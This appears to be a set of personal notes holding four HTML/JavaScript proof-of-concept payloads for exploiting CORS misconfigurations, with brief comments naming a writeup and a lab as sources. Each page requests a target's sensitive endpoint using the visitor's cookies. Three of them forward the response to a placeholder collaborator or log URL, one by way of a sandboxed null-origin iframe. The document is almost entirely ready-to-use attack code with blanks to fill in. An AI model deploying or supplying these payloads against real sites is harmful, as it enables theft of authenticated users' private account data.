<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://TARGET-SITE/sensitive-endpoint', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  fetch('https://YOUR-COLLABORATOR-URL/log?key=' + data.FIELD_NAME);
})
.catch(err => {
  // Swallowed in production PoC; use DevTools Console while debugging
});
</script>
</body>
</html>

#or use this 

<!DOCTYPE html>
<html>
<body>
<script>
var req = new XMLHttpRequest();
req.onload = function(){
  location='https://YOUR-COLLABORATOR-URL/log?key='+this.responseText;
};
req.open('get','https://TARGET-SITE/sensitive-endpoint',true);
req.withCredentials = true;
req.send();
</script>
</body>
</html>

#THIS ONE IS FROM A WRITEUP (SO ITS LEGIT) : I could read user data from an authenticated session, if the victim visited my page.

<!DOCTYPE html>
<html>
<body>
<script>
  fetch("https://target.com/api/endpoint", {
    credentials: "include"
  })
  .then(res => res.text())
  .then(data => document.body.innerText = data);
</script>
</body>
</html>

#TAKEN FROM THE NULL-LAB

<!DOCTYPE html>
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
req.onload = function(){
  location='https://YOUR-LOG-ENDPOINT/log?key='+this.responseText;
};
req.open('get','https://TARGET-SITE/accountDetails',true);
req.withCredentials = true;
req.send();
</script>
"></iframe>
</body>
</html>
